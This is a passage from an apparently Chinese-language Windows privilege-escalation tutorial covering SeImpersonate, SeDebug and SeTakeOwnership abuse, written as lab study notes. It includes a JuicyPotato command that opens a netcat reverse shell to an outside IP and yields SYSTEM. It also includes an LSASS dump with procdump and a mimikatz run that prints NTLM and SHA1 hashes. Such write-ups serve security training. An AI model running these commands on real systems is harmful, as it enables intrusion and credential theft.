<td>此策略设置确定哪些用户或组可以通过远程桌面服务连接访问远程设备的登录屏幕。用户可以与特定服务器建立远程桌面服务连接，但不能登录到同一服务器的控制台。</td>
</tr>
<tr>
<td>SeBackupPrivilege</td>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories">Back up files and directories</a></td>
<td>Administrators</td>
<td>此用户权限决定哪些用户可以绕过文件和目录、注册表和其他持久对象权限来备份系统。</td>
</tr>
<tr>
<td>SeSecurityPrivilege</td>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/manage-auditing-and-security-log">Manage auditing and security log</a></td>
<td>Administrators</td>
<td>此策略设置确定哪些用户可以为单个资源（例如文件、Active Directory 对象和注册表项）指定对象访问审核选项。这些对象指定其系统访问控制列表 (SACL)。分配了此用户权限的用户还可以在事件查看器中查看和清除安全日志。</td>
</tr>
<tr>
<td>SeTakeOwnershipPrivilege</td>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects">Take ownership of files or other objects</a></td>
<td>Administrators</td>
<td>此策略设置确定哪些用户可以拥有设备中任何可安全对象的所有权，包括 Active Directory 对象、NTFS 文件和文件夹、打印机、注册表项、服务、进程和线程。</td>
</tr>
<tr>
<td>SeDebugPrivilege</td>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs">Debug programs</a></td>
<td>Administrators</td>
<td>此策略设置确定哪些用户可以附加到或打开任何进程，即使是他们不拥有的进程。正在调试其应用程序的开发人员不需要此用户权限。正在调试新系统组件的开发人员需要此用户权限。此用户权限提供对敏感和关键操作系统组件的访问权限。</td>
</tr>
<tr>
<td>SeImpersonatePrivilege</td>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication">Impersonate a client after authentication</a></td>
<td>Administrators, Local Service, Network Service, Service</td>
<td>此策略设置确定哪些程序被允许模拟用户或另一个指定帐户并代表用户行事。</td>
</tr>
<tr>
<td>SeLoadDriverPrivilege</td>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/load-and-unload-device-drivers">Load and unload device drivers</a></td>
<td>Administrators</td>
<td>此策略设置确定哪些用户可以动态加载和卸载设备驱动程序。如果设备上的 driver.cab 文件中已存在新硬件的签名驱动程序，则不需要此用户权限。设备驱动程序作为高权限代码运行。</td>
</tr>
<tr>
<td>SeRestorePrivilege</td>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/restore-files-and-directories">Restore files and directories</a></td>
<td>Administrators</td>
<td>此安全设置确定哪些用户在还原备份文件和目录时可以绕过文件、目录、注册表和其他持久对象权限。它确定哪些用户可以将有效的安全主体设置为对象的所有者。</td>
</tr>
</tbody></table>
<p><code>whoami /priv </code> 打印当前用户的权限的列表。某些权限仅供管理用户使用，并且仅在运行提升的 cmd 或 PowerShell 会话时才能列出&#x2F;利用。这些提升权限和用户帐户控制 (UAC) 的概念是 Windows Vista 引入的安全功能，默认限制应用程序在必要时以完全权限运行。</p>
<h3 id="管理用户权限"><a href="#管理用户权限" class="headerlink" title="管理用户权限"></a>管理用户权限</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; whoami </span><br><span class="line"></span><br><span class="line">winlpe<span class="literal">-srv01</span>\administrator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                            Description                                                        State</span><br><span class="line">========================================= ================================================================== ========</span><br><span class="line">SeIncreaseQuotaPrivilege                  Adjust memory quotas <span class="keyword">for</span> a <span class="keyword">process</span>                                 Disabled</span><br><span class="line">SeSecurityPrivilege                       Manage auditing and security log                                   Disabled</span><br><span class="line">SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled</span><br><span class="line">SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled</span><br><span class="line">SeSystemProfilePrivilege                  Profile system performance                                         Disabled</span><br><span class="line">SeSystemtimePrivilege                     Change the system time                                             Disabled</span><br><span class="line">SeProfileSingleProcessPrivilege           Profile single <span class="keyword">process</span>                                             Disabled</span><br><span class="line">SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled</span><br><span class="line">SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled</span><br><span class="line">SeBackupPrivilege                         Back up files and directories                                      Disabled</span><br><span class="line">SeRestorePrivilege                        Restore files and directories                                      Disabled</span><br><span class="line">SeShutdownPrivilege                       Shut down the system                                               Disabled</span><br><span class="line">SeDebugPrivilege                          Debug programs                                                     Disabled</span><br><span class="line">SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled</span><br><span class="line">SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled</span><br><span class="line">SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled</span><br><span class="line">SeUndockPrivilege                         Remove computer from docking station                               Disabled</span><br><span class="line">SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled</span><br><span class="line">SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled</span><br><span class="line">SeCreateGlobalPrivilege                   Create global objects                                              Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege             Increase a <span class="keyword">process</span> working <span class="built_in">set</span>                                     Disabled</span><br><span class="line">SeTimeZonePrivilege                       Change the time zone                                               Disabled</span><br><span class="line">SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled</span><br><span class="line">SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token <span class="keyword">for</span> another user <span class="keyword">in</span> the same session Disabled </span><br></pre></td></tr></table></figure>

<p>当帐户的权限处于禁用状态时，这意味着帐户已分配特定权限。但是，在启用权限之前，它不能用于访问令牌以执行相关操作。Windows 不提供内置命令或 PowerShell cmdlet 来启用权限，因此需要一些脚本来帮助提升权限。</p>
<h3 id="标准用户权限"><a href="#标准用户权限" class="headerlink" title="标准用户权限"></a>标准用户权限</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; whoami </span><br><span class="line"></span><br><span class="line">winlpe<span class="literal">-srv01</span>\htb<span class="literal">-student</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== ========</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a <span class="keyword">process</span> working <span class="built_in">set</span> Disabled</span><br></pre></td></tr></table></figure>

<h3 id="备份操作员权限"><a href="#备份操作员权限" class="headerlink" title="备份操作员权限"></a>备份操作员权限</h3><p>此组中的用户确实拥有 UAC 当前限制的其他权限。不过，可以从此命令中看到他们拥有 SeShutdownPrivilege，这意味着他们可以关闭域控制器，如果他们在本地（而不是通过 RDP 或 WinRM）登录域控制器，可能会导致大规模服务中断。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== ========</span><br><span class="line">SeShutdownPrivilege           Shut down the system           Disabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a <span class="keyword">process</span> working <span class="built_in">set</span> Disabled</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="User-Privileges"><a href="#User-Privileges" class="headerlink" title="User Privileges"></a>User Privileges</h1><h2 id="SeImpersonate-SeAssignPrimaryToken"><a href="#SeImpersonate-SeAssignPrimaryToken" class="headerlink" title="SeImpersonate &amp; SeAssignPrimaryToken"></a>SeImpersonate &amp; SeAssignPrimaryToken</h2><p>在 Windows 中，每个进程都有一个令牌，其中包含有关运行该进程的帐户的信息。要使用令牌，<code>SeImpersonate</code>需要特权。它只提供给管理帐户，在大多数情况下，可以在系统强化期间删除。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Privilege Name                Description                               State      </span><br><span class="line"></span><br><span class="line">============================= ========================================= ========   </span><br><span class="line"></span><br><span class="line">SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   </span><br><span class="line">SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   </span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    </span><br><span class="line">SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    </span><br><span class="line">SeImpersonatePrivilege        Impersonate a client after authentication Enabled    </span><br><span class="line">SeCreateGlobalPrivilege       Create global objects                     Enabled    </span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   </span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato">JuicyPotato</a> 可用于通过 DCOM&#x2F;NTLM 反射滥用来利用 SeImpersonate 或 SeAssignPrimaryToken 权限。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; .\<span class="title">JuicyPotato.exe</span> -<span class="title">l</span> 53375 -<span class="title">p</span> <span class="title">c</span>:\<span class="title">windows</span>\<span class="title">system32</span>\<span class="title">cmd.exe</span> -<span class="title">a</span> &quot;/<span class="title">c</span> .\<span class="title">nc.exe</span> 10.10.14.3 8443 -<span class="title">e</span> <span class="title">cmd.exe</span>&quot; -<span class="title">t</span> *</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lnvp 8443</span><br><span class="line"></span><br><span class="line">listening on [any] 8443 ...</span><br><span class="line">connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332</span><br><span class="line">Microsoft Windows [Version 10.0.14393]</span><br><span class="line">(c) 2016 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line"></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>

<p>JuicyPotato 不适用于 Windows Server 2019 和 Windows 10 build 1809 及更高版本。<a target="_blank" rel="noopener" href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a>和<a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RoguePotato">RoguePotato</a>可用于利用相同的权限并获得<code>NT AUTHORITY\SYSTEM</code>级别访问权限。</p>
<h2 id="SeDebugPrivilege"><a href="#SeDebugPrivilege" class="headerlink" title="SeDebugPrivilege"></a>SeDebugPrivilege</h2><p>要运行特定应用程序或服务或协助进行故障排除，可以为用户分配 SeDebugPrivilege，而不是将帐户添加到管理员组。默认情况下，只有管理员被授予此权限，因为它可用于从系统内存中捕获敏感信息，或访问&#x2F;修改内核和应用程序结构。</p>
<p>Windows 设置</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1731553925420.png" alt="debug"></p>
<p>查看权限</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">whoami</span> /<span class="title">priv</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">PRIVILEGES</span> <span class="title">INFORMATION</span></span></span><br><span class="line"><span class="function">----------------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Privilege</span> <span class="title">Name</span>                            <span class="title">Description</span>                                                        <span class="title">State</span></span></span><br><span class="line"><span class="function">========================================= ================================================================== ========</span></span><br><span class="line"><span class="function"><span class="title">SeDebugPrivilege</span>                          <span class="title">Debug</span> <span class="title">programs</span>                                                     <span class="title">Disabled</span></span></span><br><span class="line"><span class="function"><span class="title">SeChangeNotifyPrivilege</span>                   <span class="title">Bypass</span> <span class="title">traverse</span> <span class="title">checking</span>                                           <span class="title">Enabled</span></span></span><br><span class="line"><span class="function"><span class="title">SeIncreaseWorkingSetPrivilege</span>             <span class="title">Increase</span> <span class="title">a</span> <span class="title">process</span> <span class="title">working</span> <span class="title">set</span>                                     <span class="title">Disabled</span></span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">SysInternals</a> 套件中的  <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">ProcDump</a> 可以利用此权限并转储进程内存</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">procdump.exe</span> -<span class="title">accepteula</span> -<span class="title">ma</span> <span class="title">lsass.exe</span> <span class="title">lsass.dmp</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">ProcDump</span> <span class="title">v10</span>.0 - <span class="title">Sysinternals</span> <span class="title">process</span> <span class="title">dump</span> <span class="title">utility</span></span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> (<span class="title">C</span>) 2009-2020 <span class="title">Mark</span> <span class="title">Russinovich</span> <span class="title">and</span> <span class="title">Andrew</span> <span class="title">Richards</span></span></span><br><span class="line"><span class="function"><span class="title">Sysinternals</span> - <span class="title">www.sysinternals.com</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[15:25:45] <span class="title">Dump</span> 1 <span class="title">initiated</span>: <span class="title">C</span>:\<span class="title">Tools</span>\<span class="title">Procdump</span>\<span class="title">lsass.dmp</span></span></span><br><span class="line"><span class="function">[15:25:45] <span class="title">Dump</span> 1 <span class="title">writing</span>: <span class="title">Estimated</span> <span class="title">dump</span> <span class="title">file</span> <span class="title">size</span> <span class="title">is</span> 42 <span class="title">MB</span>.</span></span><br><span class="line"><span class="function">[15:25:45] <span class="title">Dump</span> 1 <span class="title">complete</span>: 43 <span class="title">MB</span> <span class="title">written</span> <span class="title">in</span> 0.5 <span class="title">seconds</span></span></span><br><span class="line"><span class="function">[15:25:46] <span class="title">Dump</span> <span class="title">count</span> <span class="title">reached</span>.</span></span><br></pre></td></tr></table></figure>

<p>如果具有 RDP 访问权限，还可以通过任务管理器手动转储 LSASS 进程的内存，”详细信息”选项卡，选择 LSASS 进程，然后选择”创建转储文件”。</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1731556395375.png" alt="WPE_taskmgr_lsass"></p>
<p>然后可以使用 sekurlsa::minidump 命令将其加载到 Mimikatz 中。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">mimikatz.exe</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  .#####.   <span class="title">mimikatz</span> 2.2.0 (<span class="title">x64</span>) #19041 <span class="title">Sep</span> 18 2020 19:18:29</span></span><br><span class="line"><span class="function"> .## ^ ##.  &quot;<span class="title">A</span> <span class="title">La</span> <span class="title">Vie</span>, <span class="title">A</span> <span class="title">L</span>&#x27;<span class="title">Amour</span>&quot; - (<span class="title">oe.eo</span>)</span></span><br><span class="line"><span class="function"> ## / \ ##  /*** <span class="title">Benjamin</span> <span class="title">DELPY</span> `<span class="title">gentilkiwi</span>` ( <span class="title">benjamin</span>@<span class="title">gentilkiwi.com</span> )</span></span><br><span class="line"><span class="function"> ## \ / ##       &gt; <span class="title">https</span>://<span class="title">blog.gentilkiwi.com</span>/<span class="title">mimikatz</span></span></span><br><span class="line"><span class="function"> &#x27;## <span class="title">v</span> ##&#x27;       <span class="title">Vincent</span> <span class="title">LE</span> <span class="title">TOUX</span>             ( <span class="title">vincent.letoux</span>@<span class="title">gmail.com</span> )</span></span><br><span class="line"><span class="function">  &#x27;#####&#x27;        &gt; <span class="title">https</span>://<span class="title">pingcastle.com</span> / <span class="title">https</span>://<span class="title">mysmartlogon.com</span> ***/</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">mimikatz</span> # <span class="title">log</span></span></span><br><span class="line"><span class="function"><span class="title">Using</span> &#x27;<span class="title">mimikatz.log</span>&#x27; <span class="title">for</span> <span class="title">logfile</span> : <span class="title">OK</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">mimikatz</span> # <span class="title">sekurlsa</span>::<span class="title">minidump</span> <span class="title">lsass.dmp</span></span></span><br><span class="line"><span class="function"><span class="title">Switch</span> <span class="title">to</span> <span class="title">MINIDUMP</span> : &#x27;<span class="title">lsass.dmp</span>&#x27;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">mimikatz</span> # <span class="title">sekurlsa</span>::<span class="title">logonpasswords</span></span></span><br><span class="line"><span class="function"><span class="title">Opening</span> : &#x27;<span class="title">lsass.dmp</span>&#x27; <span class="title">file</span> <span class="title">for</span> <span class="title">minidump</span>...</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Authentication</span> <span class="title">Id</span> : 0 ; 23196355 (00000000:0161<span class="title">f2c3</span>)</span></span><br><span class="line"><span class="function"><span class="title">Session</span>           : <span class="title">Interactive</span> <span class="title">from</span> 4</span></span><br><span class="line"><span class="function"><span class="title">User</span> <span class="title">Name</span>         : <span class="title">DWM</span>-4</span></span><br><span class="line"><span class="function"><span class="title">Domain</span>            : <span class="title">Window</span> <span class="title">Manager</span></span></span><br><span class="line"><span class="function"><span class="title">Logon</span> <span class="title">Server</span>      : (<span class="title">null</span>)</span></span><br><span class="line"><span class="function"><span class="title">Logon</span> <span class="title">Time</span>        : 3/31/2021 3:00:57 <span class="title">PM</span></span></span><br><span class="line"><span class="function"><span class="title">SID</span>               : <span class="title">S</span>-1-5-90-0-4</span></span><br><span class="line"><span class="function">        <span class="title">msv</span> :</span></span><br><span class="line"><span class="function">        <span class="title">tspkg</span> :</span></span><br><span class="line"><span class="function">        <span class="title">wdigest</span> :</span></span><br><span class="line"><span class="function">         * <span class="title">Username</span> : <span class="title">WINLPE</span>-<span class="title">SRV01</span>$</span></span><br><span class="line"><span class="function">         * <span class="title">Domain</span>   : <span class="title">WORKGROUP</span></span></span><br><span class="line"><span class="function">         * <span class="title">Password</span> : (<span class="title">null</span>)</span></span><br><span class="line"><span class="function">        <span class="title">kerberos</span> :</span></span><br><span class="line"><span class="function">        <span class="title">ssp</span> :</span></span><br><span class="line"><span class="function">        <span class="title">credman</span> :</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&lt;<span class="title">SNIP</span>&gt; </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Authentication</span> <span class="title">Id</span> : 0 ; 23026942 (00000000:015<span class="title">f5cfe</span>)</span></span><br><span class="line"><span class="function"><span class="title">Session</span>           : <span class="title">RemoteInteractive</span> <span class="title">from</span> 2</span></span><br><span class="line"><span class="function"><span class="title">User</span> <span class="title">Name</span>         : <span class="title">jordan</span></span></span><br><span class="line"><span class="function"><span class="title">Domain</span>            : <span class="title">WINLPE</span>-<span class="title">SRV01</span></span></span><br><span class="line"><span class="function"><span class="title">Logon</span> <span class="title">Server</span>      : <span class="title">WINLPE</span>-<span class="title">SRV01</span></span></span><br><span class="line"><span class="function"><span class="title">Logon</span> <span class="title">Time</span>        : 3/31/2021 2:59:52 <span class="title">PM</span></span></span><br><span class="line"><span class="function"><span class="title">SID</span>               : <span class="title">S</span>-1-5-21-3769161915-3336846931-3985975925-1000</span></span><br><span class="line"><span class="function">        <span class="title">msv</span> :</span></span><br><span class="line"><span class="function">         [00000003] <span class="title">Primary</span></span></span><br><span class="line"><span class="function">         * <span class="title">Username</span> : <span class="title">jordan</span></span></span><br><span class="line"><span class="function">         * <span class="title">Domain</span>   : <span class="title">WINLPE</span>-<span class="title">SRV01</span></span></span><br><span class="line"><span class="function">         * <span class="title">NTLM</span>     : <span class="title">cf3a5525ee9414229e66279623ed5c58</span></span></span><br><span class="line"><span class="function">         * <span class="title">SHA1</span>     : 3<span class="title">c7374127c9a60f9e5b28d3a343eb7ac972367b2</span></span></span><br><span class="line"><span class="function">        <span class="title">tspkg</span> :</span></span><br><span class="line"><span class="function">        <span class="title">wdigest</span> :</span></span><br><span class="line"><span class="function">         * <span class="title">Username</span> : <span class="title">jordan</span></span></span><br><span class="line"><span class="function">         * <span class="title">Domain</span>   : <span class="title">WINLPE</span>-<span class="title">SRV01</span></span></span><br><span class="line"><span class="function">         * <span class="title">Password</span> : (<span class="title">null</span>)</span></span><br><span class="line"><span class="function">        <span class="title">kerberos</span> :</span></span><br><span class="line"><span class="function">         * <span class="title">Username</span> : <span class="title">jordan</span></span></span><br><span class="line"><span class="function">         * <span class="title">Domain</span>   : <span class="title">WINLPE</span>-<span class="title">SRV01</span></span></span><br><span class="line"><span class="function">         * <span class="title">Password</span> : (<span class="title">null</span>)</span></span><br><span class="line"><span class="function">        <span class="title">ssp</span> :</span></span><br><span class="line"><span class="function">        <span class="title">credman</span> :</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&lt;<span class="title">SNIP</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>还可以利用 SeDebugPrivilege 进行 RCE。使用这种技术，可以启动子进程并使用通过 SeDebugPrivilege 授予帐户的提升权限来更改正常系统行为，从而将权限提升到 SYSTEM，以继承父进程的令牌并模拟它。</p>
<p>输入用户凭证，以管理员身份运行 Powershell，获取正在运行的进程 PID</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; tasklist</span><br><span class="line"></span><br><span class="line">Image Name                     PID Session Name        Session<span class="comment">#    Mem Usage</span></span><br><span class="line">========================= ======== ================ =========== ============</span><br><span class="line">System Idle <span class="keyword">Process</span>              <span class="number">0</span> Services                   <span class="number">0</span>          <span class="number">4</span> K</span><br><span class="line">System                           <span class="number">4</span> Services                   <span class="number">0</span>        <span class="number">116</span> K</span><br><span class="line">smss.exe                       <span class="number">340</span> Services                   <span class="number">0</span>      <span class="number">1</span>,<span class="number">212</span> K</span><br><span class="line">csrss.exe                      <span class="number">444</span> Services                   <span class="number">0</span>      <span class="number">4</span>,<span class="number">696</span> K</span><br><span class="line">wininit.exe                    <span class="number">548</span> Services                   <span class="number">0</span>      <span class="number">5</span>,<span class="number">240</span> K</span><br><span class="line">csrss.exe                      <span class="number">556</span> Console                    <span class="number">1</span>      <span class="number">5</span>,<span class="number">972</span> K</span><br><span class="line">winlogon.exe                   <span class="number">612</span> Console                    <span class="number">1</span>     <span class="number">10</span>,<span class="number">408</span> K</span><br></pre></td></tr></table></figure>

<p>Command</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[MyProcess]::CreateProcessFromParent(&lt;system_pid&gt;,&lt;command_to_execute&gt;,&quot;&quot;)</span><br></pre></td></tr></table></figure>

<p>这里定位<code>winlogon.exe</code>在 PID 612 下运行，它在 Windows 主机上以 SYSTEM 身份运行。</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1731559504527.png" alt="psgetsys_winlogon"></p>
<p>还可以使用 Get-Process cmdlet 来获取以 SYSTEM 身份运行的进程（例如 LSASS）的 PID</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1731559510936.png" alt="psgetsys_lsass"></p>
<h2 id="SeTakeOwnershipPrivilege"><a href="#SeTakeOwnershipPrivilege" class="headerlink" title="SeTakeOwnershipPrivilege"></a>SeTakeOwnershipPrivilege</h2><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects">SeTakeOwnershipPrivilege</a> 授予用户 “可保护对象” 的能力，这些对象包括 Active Directory 对象、NTFS 文件&#x2F;文件夹、打印机、注册表项、服务和进程。此权限分配对象的 WRITE_OWNER 权限，这意味着用户可以在对象的安全描述符中更改所有者。默认情况下，管理员被分配此权限。</p>
<p>凭借此权限，用户可以拥有任何文件或对象的所有权，并进行可能涉及访问敏感数据、远程代码执行 (RCE) 或拒绝服务 (DOS) 的更改。</p>
<p>在组策略中设置此设置：<code>Computer Configuration</code> ⇾ <code>Windows Settings</code> ⇾ <code>Security Settings</code> ⇾ <code>Local Policies</code> ⇾ <code>User Rights Assignment</code></p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1731564633098.png" alt="setakeowner2"></p>
<p>假设遇到具有此权限的用户，或者通过使用<a target="_blank" rel="noopener" href="https://github.com/FSecureLABS/SharpGPOAbuse">SharpGPOAbuse</a>的 GPO 滥用等攻击将其分配给他们。在这种情况下，可以使用此权限来控制共享文件夹或敏感文件，例如包含密码或 SSH 密钥的文档。</p>
<p><strong>exploit</strong></p>
